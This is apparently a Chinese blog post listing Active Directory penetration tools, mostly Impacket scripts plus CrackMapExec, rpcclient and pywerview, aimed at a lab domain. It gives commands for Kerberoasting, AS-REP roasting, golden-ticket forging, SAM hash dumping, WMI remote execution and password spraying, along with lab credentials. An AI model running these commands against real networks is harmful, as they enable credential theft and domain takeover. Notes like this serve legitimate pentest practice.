---
title: 域渗透常用工具
published: 2025-03-09 16:46:27
tags: [内网安全,域渗透]
category: 安全
draft: false
---

# 域渗透常用工具

## Impacket 工具包

> https://github.com/fortra/impacket
> 

> https://xz.aliyun.com/t/11877?time__1311=Cq0xuD0DnAit%3DGNeeeu0QDRi7G8D9lmaoD
> 

### lookupsid.py

当目标靶机开启`LDAP` （会暴露域名）且没有任何凭据时可以使用，可以枚举用户名

有用户时可以查看域内用户以及域`SID`等

### GetUserSPN.py

使用指定用户向DC发起请求，并且抓获TGS，然后进行破解，通常用于`Kerberaoting`

前提：域控开启LDAP

```python
python GetUserSPNs.py domain/username:password -dc-ip <domain-controller-ip> 
python GetUserSPNs.py domain/username:password -dc-ip <domain-controller-ip> -request
```

### GetNPUsers.py

当 当前用户获取不到`SPN`的时候，可以通过该脚本寻找没有开启`kerberos`预认证的用户，禁用预认证的用户会向`DC`发送不加密的身份验证信息，因此可以捕获`AS-REP`响应进行破解

```bash
GetNPUsers.py -dc-ip 192.168.56.126 SOUPEDECODE.LOCAL/ -usersfile username.txt
```

### reg.py

结合查询，添加，删除关键字的组合使用时，可以读取，修改和删除注册表值,该脚本就是利用 reg 服务，它可用于获取有关各种策略，软件的信息，还可以更改其中一些策略

```python
reg.py [域] / [用户]：[密码：密码哈希] @ [目标 IP 地址] [操作] [操作参数]
```

### ticketer.py

用于生成票据

```bash
# 生成黄金票据
ticketer.py -nthash 0f55cdc40bd8f5814587f7e6b2f85e6f -domain SOUPEDECODE.LOCAL -domain-sid S-1-5-21-2986980474-46765180-2505414164 administrator
```

### **secretsdump.py**

本地解密SAM

```python
py -3 secretsdump.py -sam sam.save -system system.save -security security.save LOCAL
```

### wmiexec.py

是 `Impacket` 工具集中的一个脚本，用于通过 `Windows Management Instrumentation` (`WMI`) 执行命令

`WMI` 是 `Windows` 操作系统的一种管理工具，通常用于监控和管理操作系统、硬件以及应用程序

```bash
wmiexec.py <target_IP> -u <username> -p <password> <command>
```

用其导入票据 `-k`  需要环境变量：`KRB5CCNAME`

```bash
wmiexec.py soupedecode.local/administrator@dc01.soupedecode.local -k -target-ip 192.168.56.126
```

## CrackMapExec

> https://github.com/byt3bl33d3r/CrackMapExec
> 

> https://blog.csdn.net/qq_42077227/article/details/130279040
> 

可以做到密码喷洒等操作

### 常用命令

当收集到一组密码和用户名需要验证时使用

```python
crackmapexec smb 192.168.56.128 -u username.txt -p username.txt --continue-on-success --no-bruteforce | grep + 
```

## Netexec nxc

> https://github.com/Pennyw0rth/NetExec
> 

> https://blog.csdn.net/FreeBuf_/article/details/135914559
> 

## RPCclient

当你用户存在`RPC`权限时，并且端口`135` `MS-RPC`开启时，可疑使用`rpcclient`来获取用户信息

```bash
rpcclient -U SOUPEDDECODE.LOCAL/websvc%jordan123 192.168.56.126 -c "querydispinfo" 
```

## pywerview

用来查看用户信息，查看当前组等等

https://github.com/the-useless-one/pywerview?tab=readme-ov-file

使用当前用户的凭据来查找用户信息，并指定用户户名

```bash
pywerview get-netuser -w soupedecode.local --dc-ip 192.168.56.126 -u xkate578 -p jesuschrist --username xkate578
```